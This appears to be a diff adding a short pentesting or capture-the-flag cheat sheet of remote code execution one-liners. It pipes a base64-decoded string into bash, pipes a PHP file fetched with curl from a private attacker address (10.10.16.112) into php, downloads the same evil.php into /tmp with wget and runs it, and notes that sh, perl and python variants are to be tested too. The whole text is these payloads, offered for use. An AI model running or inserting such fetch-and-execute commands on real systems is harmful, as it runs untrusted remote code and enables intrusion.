@@ -1,0 +1,9 @@
+echo "bash command in base 64" | base64 -d | bash
+
+curl "http://10.10.16.112/evil.php" | php
+
+wget "http://10.10.16.112/evil.php" -O /tmp/evil.php; php /tmp/evil.php
+
+(Test the same thing for sh, perl, python)
+
+
